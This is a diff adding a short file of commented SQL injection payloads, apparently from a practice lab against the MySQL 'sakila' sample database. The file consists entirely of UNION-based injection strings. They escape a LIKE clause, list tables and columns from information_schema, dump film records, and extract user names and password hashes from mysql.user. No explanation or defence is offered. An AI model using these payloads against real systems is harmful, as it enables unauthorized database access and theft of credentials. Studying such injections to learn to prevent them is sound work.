@@ -1,0 +1,24 @@
+# default query
+select ?,?,? from ? where ? like '% %';
+
+# comment the rest of the script
+select ?,?,? from ? where ? like '%'; #
+
+# get application tables
+select 1,2,3,4 from table where first_name '%ann' union select table_name, table_schema, 1,2 from information_schema.tables; # %'
+
+# append the table names to the results
+' union select 1, table_name, table_schema, 2,3 from information_schema.tables; #
+
+# append the table names of the database to the results
+' union select 1, table_name, table_schema, 2,3 from information_schema.tables where table_schema = 'sakila'; #
+
+# append the column names of the tables 
+' union select 1, table_name, column_name, 2,3 from information_schema.columns where table_name = 'customer'; #
+' union select 1, table_name, column_name, 2,3 from information_schema.columns where table_name = 'film'; #
+
+# append table column data to the results
+' union select 1, title, description, rating,3 from film; #
+
+# append login user/password data to the results
+' union select 1, user, authentication_string, 2,3 from mysql.user ; #
